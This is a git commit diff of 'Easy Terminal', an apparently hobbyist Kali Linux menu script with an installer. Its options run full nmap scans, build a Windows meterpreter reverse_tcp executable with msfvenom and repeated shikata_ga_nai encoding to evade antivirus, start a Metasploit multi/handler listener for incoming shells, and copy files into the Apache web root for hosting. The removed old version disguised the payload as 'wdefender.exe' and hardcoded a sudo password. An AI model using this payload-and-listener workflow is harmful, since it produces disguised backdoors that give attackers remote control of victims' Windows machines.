98e82a78c38cc471182439a0ca2976378ee7392c
DevBO7MED <mamd245r@gmail.com>
2024-08-10 19:52:09 -0400

    Initial commit of easy terminal script

--- eterm.sh
+++ eterm.sh
@@ -1,30 +1,42 @@
-#!/bin/bash
+#!/bin/sh
 
 print_menu() {
-    echo "========================================================================="
+    echo $Blue2"========================================================================="
     figlet "Easy Terminal" | lolcat
     echo " [---] Welcome To Easy Terminal This Tool By Author : [---]"
     figlet "BO7MED MIX YT" | lolcat
-    echo "========================================================================="
-    echo ""
-    echo "============================="
-    echo "[1]. Start Metasploit"
-    echo "============================="
-    echo "[2]. Start Nessus"
-    echo "============================="
-    echo "[3]. Make Payload"
-    echo "============================="
-    echo "[4]. Start Apache2"
-    echo "============================="
-    echo "[5]. Stop Apache2"
-    echo "============================="
-    echo "[6]. Remove Sys Old Files"
-    echo "============================="
-    echo "[7]. Update & Upgrade"
-    echo "============================="
-    echo "[8]. Exit"
-    echo "============================="
+    echo $Blue2"========================================================================="
+    echo 
+    echo $red "==============================" $red "=============================="
+    echo $red "[1]. Start Nmap Scan          " $red "[2]. Make Payload             "
+    echo $red "==============================" $red "=============================="
+    echo $cyan "==============================" $cyan "=============================="
+    echo $cyan "[3]. Creat Metasploit Listener" $cyan "[4]. Start Nessus             "
+    echo $cyan "==============================" $cyan "=============================="
+    echo $okegreen  "==============================" $okegreen "=============================="
+    echo $okegreen  "[5]. Start Apache2            " $okegreen "[6]. Stop Apache2             "
+    echo $okegreen  "==============================" $okegreen "=============================="
+    echo $yellow "=============================="  $yellow "=============================="
+    echo $yellow "[7]. Update & Upgrade System  "  $yellow "[8]. Remove Old Updates Files"
+    echo $yellow "=============================="  $yellow "=============================="
+                                     
+    echo $white                 "=============================="
+    echo $white                 "[9]. Exit                     "
+    echo $white                 "=============================="
+    
+
+
 }
+
+
+cyan='\e[0;36m'
+Blue2='\e[0;34m'
+okegreen='\033[92m'
+white='\e[1;37m'
+red='\e[1;31m'
+yellow='\e[0;33m'
+Blue='\e[1;34m'
+
 
 show_ip_addresses() {
     echo "========================================================================="
@@ -38,84 +50,130 @@ show_ip_addresses() {
     echo "========================================================================="
 }
 
+
+
 execute_option() {
     case $1 in
         1)
-            xterm -hold -e "
-                # عرض عناوين IP
-                echo '========================================================================='
-                echo 'IPv4 and IPv6 Addresses'
-                echo '========================================================================='
-                echo 'IPv4 Addresses:'
-                ip -4 addr show | grep inet | awk '{print \$2}'
-                echo ''
-                echo 'IPv6 Addresses:'
-                ip -6 addr show | grep inet6 | awk '{print \$2}'
-                echo '========================================================================='
-
-                # طلب إدخال LHOST و LPORT
+            read -p "Enter The Target Ip Or Link : " IP
+            sudo nmap -sS -O -Pn -sV -p- $IP
+            echo
+            echo $okegreen"Press [ENTER] key to return to menu ."
+            read cont
+            clear 
+            ;;
+        
+        
+        
+        2)  
+            echo
+            echo
+            read -p "Enter LHOST (IP): " lhost
+            echo
+            read -p "Enter LPORT (Port): " lport
+            echo
+            read -p "Enter Payload Path (Such As "/home/kali") : " L
+            echo
+            read -p "Enter Payload Name (Such As "Payload.exe") : " N
+            echo
+            echo "Creating Payload..."
+            payload_path="$L"
+            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport --platform windows -a x86 -f exe -e x86/shikata_ga_nai -i 5 -o $payload_path/$N
+            clear
+            print_menu
+            echo
+            echo
+            echo "Payload created successfully!"
+            echo
+            echo "Path to payload: $payload_path/$N"
+            echo
+            echo $okegreen"Press [ENTER] key to return to menu ."
+            read cont
+            clear
+            ;;       
+        
+        
+        
+        3)  
+            sudo postgresql service start
+            sudo msfdb init
+            xterm -fa monaco -fs 13 -bg black -e "
+               
+                echo
                 echo 'Enter LHOST (IP address for Metasploit):'
                 read LHOST
                 echo 'Enter LPORT (Port for Metasploit):'
                 read LPORT
-                
-                echo 'Your IP address is:'
-                echo \$LHOST
-                echo 'Starting Metasploit with LHOST=\$LHOST and LPORT=\$LPORT...'
+                echo 'Starting Metasploit With Listener...'
 
-                # بدء Metasploit
-                msfconsole -x \"use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST \$LHOST; set LPORT \$LPORT; exploit\"
+               
+                msfconsole -q -x \"use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST \$LHOST; set LPORT \$LPORT; exploit\"
             " &
             ;;
-        2)
-            echo "Starting Nessus"
-            echo "kali" | sudo -S systemctl start nessusd
-            clear
-            sleep 2
-            xdg-open https://localhost:8834
-            ;;
-        3)
-            echo "Creating Payload..."
-            read -p "Enter LHOST (IP): " lhost
-            read -p "Enter LPORT (Port): " lport
-            payload_path="/home/kali/wdefender.exe"
-            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport --platform windows -a x86 -f exe -e x86/shikata_ga_nai -i 5 -o $payload_path
-            echo "Payload created successfully!"
-            echo "Path to payload: $payload_path"
-            echo "LHOST: $lhost"
-            echo "LPORT: $lport"
-            ;;
         4)
+            echo "Starting Nessus"
+            sudo systemctl start nessusd
+            clear
+            echo "Nessus Started Successfully You Can Now"
+            echo
+            echo "Open Nessus By Open This Link { https://localhost:8834 }"
+            echo
+            echo $okegreen"Press [ENTER] key to return to menu ."
+            read cont
+            clear
+            ;;
+
+        5)
             echo "Starting Apache2 Service..."
-            echo "kali" | sudo -S service apache2 start
+            sudo service apache2 start
             echo
             read -p "Enter Location: " Source
             echo
             read -p "Enter Name: " Name
-            echo "kali" | sudo -S cp $Source /var/www/html/$Name
-            clear
-            ;;
-        5)
-            echo "Stopping Apache2 Service..."
-            echo "kali" | sudo -S service apache2 stop
+            sudo cp $Source /var/www/html/$Name
+            echo "Appatche Sevice Started And Upload The Files Successfuly"
+            echo
+            echo $okegreen"Press [ENTER] key to return to menu ."
+            read cont
             clear
             ;;
         6)
-            echo "Removing old system files..."
-            echo "kali" | sudo -S apt autoremove
+            echo "Stopping Apache2 Service..."
+            echo "Stopped Successfully"
+            sudo service apache2 stop
+            echo
+            echo $okegreen"Press [ENTER] key to return to menu ."
+            read cont
             clear
             ;;
+
         7)
             echo "Updating and upgrading system..."
-            echo "kali" | sudo -S apt update
-            echo "kali" | sudo -S apt upgrade
+            sudo apt update
+            sudo apt upgrade
+            echo
+            echo $okegreen"Press [ENTER] key to return to menu ."
+            read cont
+            clear
             ;;
+            
         8)
+            sudo apt autoremove
+            echo "Removed Successfully"
+            echo
+            echo $okegreen"Press [ENTER] key to return to menu ."
+            read cont
+            clear
+            ;;
+            
+        9)
             echo "Exiting..."
             exit 0
             ;;
+            
         *)
             echo "Invalid choice. Try Again."
+            sleep 2
             ;;
     esac
 }
@@ -123,6 +181,8 @@ execute_option() {
 while true; do
     clear
     print_menu
-    read -p "Choice: " choice
+    echo
+    echo $okegreen"┌─["$red"EasyTreminal$okegreen]──[$red~$okegreen]─["$yellow"Menu$okegreen]:"
+    read -p "└─────► " choice
     execute_option $choice
 done
--- install.sh
+++ install.sh
@@ -1,15 +1,16 @@
-#!/bin/bash
+#!/bin/sh
 
-echo "Starting installation..."
 
-# تحقق من أن المستخدم هو مستخدم الجذر
 if [ "$(id -u)" != "0" ]; then
     echo "This script must be run as root" 1>&2
     exit 1
 fi
 
-# تثبيت الحزم اللازمة (تعديل حسب الحاجة)
-apt-get update
-apt-get install -y figlet lolcat
-
-echo "Installation complete!"
+echo "Starting installation..."
+echo
+echo
+sudo apt-get update
+sudo apt-get install -y figlet lolcat
+echo
+echo
+echo "Installation complete! Now You Can Run The Script"
